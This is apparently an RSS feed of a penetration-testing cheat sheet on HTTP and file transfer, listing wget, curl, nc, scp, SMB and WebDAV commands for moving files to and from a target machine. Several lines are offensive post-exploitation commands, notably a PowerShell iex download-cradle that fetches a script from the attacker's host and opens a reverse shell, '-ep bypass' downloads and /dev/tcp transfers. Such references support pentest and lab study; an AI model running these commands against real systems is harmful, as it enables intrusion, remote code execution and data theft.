channel.title: Http File Transfer on TLDRBins
channel.description: Recent content in Http File Transfer on TLDRBins

item.title: Advance wget
item.description: Advance wget # Provide a file with urls wget --input-file <FILE_PATH> # POST a file wget --post-file <FILE_PATH> <TARGET> # Overwrite a file wget <TARGET>/<FILE> -O <FILE_PATH>

item.title: Connection from Public Internet
item.description: Simply catch HTTP request webhook.site Catch HTTP request and host a web server serveo.net ngrok # Start a local HTTP server python3 -m http.server <LOCAL_PORT> $ python3 -m http.server 3000 Serving HTTP on 0.0.0.0 port 3000 (http://0.0.0.0:3000/) ... # Redirect http request to localhost:<LOCAL_PORT> ssh -R 80:localhost:<LOCAL_PORT> serveo.net $ ssh -R 80:localhost:3000 serveo.net Forwarding HTTP traffic from https://7ddf32e17a6ac5ce04a8ecbf782ca509.serveo.net ngrok http 80 Ref: ngrok Note: ngrok free will show a warning message and require user accpet to proceed Note: Not good for XSS

item.title: curl
item.description: curl # Show Header Only curl -I <TARGET> # Save as the Same Name as the File on the Server curl <TARGET>/<FILE> -O # GET Url-encoded Query curl -G --data-urlencode '<QUERY_STRING>' <TARGET> # POST Url-encoded Data curl --data-urlencode '<DATA>' <TARGET> # PUT a File curl -X PUT <TARGET>/<FILE> -d @<FILE> # PUT a File (Authenticate) curl -X PUT -u '<USER>:<PASSWORD>' <TARGET>/<FILE> -d @<FILE> # PUT a File as Raw Binary (Preserve Newlines and Control Characters) curl -X PUT <TARGET>/<FILE> --data-binary @<FILE> # POST a File with Form Param curl -X POST -F '<PARAM>=@<FILE>;type=<APPLICATION_TYPE>;filename=<FILE>' <TARGET> # POST a File in Raw-text Format (Not as Attachment) curl -X POST -F '<PARAM>=<<FILE>' <TARGET> # Not to Handle Sequences of '/.

item.title: File Transfer (Linux To Linux)
item.description: HTTP nc scp PIPE Base64 # Start a local HTTP server python3 -m http.server <LOCAL_PORT> # In target Linux machine wget <LOCAL_IP>:<LOCAL_PORT>/<FILE> # In target Linux machine curl <LOCAL_IP>:<LOCAL_PORT>/<FILE> -o <REMOTE_DEST_PATH> # In our local Linux machine nc -lvnp <LOCAL_PORT> < <FILE> # In target Linux machine nc -w3 <LOCAL_IP> <LOCAL_PORT> > <FILE> Remote to Local # With password scp <USER>@<TARGET>:<REMOTE_FILE_PATH> <LOCAL_DEST_PATH> # With id_rsa scp -i id_rsa <USER>@<TARGET>:<REMOTE_FILE_PATH> <LOCAL_DEST_PATH> Local to Remote # With password scp <LOCAL_FILE_PATH> <USER>@<TARGET>:<REMOTE_DEST_PATH> # With id_rsa scp -i id_rsa <LOCAL_FILE_PATH> <USER>@<TARGET>:<REMOTE_DEST_PATH> Local to Remote # In our local Linux machine cat <FILE> | nc -lnvp <LOCAL_PORT> # In target Linux machine exec 3<>/dev/tcp/<LOCAL_IP>/<LOCAL_PORT> # Ctrl+C to interrupt after some time cat <&3 > <FILE> # Check md5sum <FILE> Small binary # Base64 encode binary cat <FILE> | base64 -w0 # Copy and paste the base64 encoded binary echo -n '<BASE64_FILE>' | base64 -d > <FILE> Note: For restricted environment

item.title: File Transfer (Linux to Windows)
item.description: Powershell cmd evil-winrm Start a Local HTTP Server python3 -m http.server <LOCAL_PORT> $ python3 -m http.server 8443 Serving HTTP on 0.0.0.0 port 8443 (http://0.0.0.0:8443/) ... # Invoke-WebRequest iwr http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> -o C:\ProgramData\<FILE> # Wget powershell -ep bypass wget <LOCAL_IP>:<LOCAL_PORT>/<FILE> -Outfile C:\ProgramData\<FILE> # Curl powershell -ep bypass curl <LOCAL_IP>:<LOCAL_PORT>/<FILE> -Outfile C:\ProgramData\<FILE> Note: curl and wget are alias to Invoke-WebRequest # Load into memory and Run # Invoke-Expression iex (New-Object Net.WebClient).DownloadString('http://<LOCAL_IP>:<LOCAL_PORT>/<FILE>');Invoke-PowerShellTcp -Reverse -IPAddress <LOCAL_IP> -Port <LOCAL_PORT> # Short version iex (iwr http://<LOCAL_IP>:<LOCAL_PORT>/<FILE> -UseBasicParsing) Ref: rev.

item.title: File Transfer (Windows To Linux)
item.description: SMB Base64 evil-winrm Start a Local SMB Server impacket-smbserver share . -smb2support cmd # Connect to SMB server without creds net use \\<LOCAL_IP>\share # Connect to SMB server with creds net use \\<LOCAL_IP>\share /u:<USER> '<PASSWORD>' # From target Windows to local Linux copy <FILE> \\<LOCAL_IP>\share # From local Linux to target Windows copy \\<LOCAL_IP>\share\<FILE> <FILE> # Delete file del <FILE> # Remove SMB share net use /d \\<LOCAL_IP>\share # Older Windows (e.

item.title: Webdav
item.description: Tools davtest curl # Without creds davtest -url http://<TARGET> # With creds davtest -url http://<TARGET> -auth '<USER>:<PASSWORD>' Ref: Download davtest # Rename a remote file curl -X MOVE -H 'Destination:http://<TARGET>/<NEW_FILENAME>' http://<TARGET>/<FILE>

item.title: Winrm from Windows VM
item.description: Preparation 0. Check Systeminfo # Windows Pro is needed systeminfo 1. Connect to VPN OpenVPN client 2. Add DNS Server +-----------------------------------------------------------------------------------+ | 1. Go to 'Control Panel\Network and Internet\Network and Sharing Center' | | 2. Click 'Local Area Connection' | | 3. Go to 'Properties' -> 'Internet Protocol Version 4 (TCP/IPv4)' -> 'Properties' | | 4. Under 'General', check 'Obtain an IP address automatically' | | 5. Check 'Use the following DNS address' -> 'Prefer DNS Server' -> <DC_IP> | +-----------------------------------------------------------------------------------+ 3.
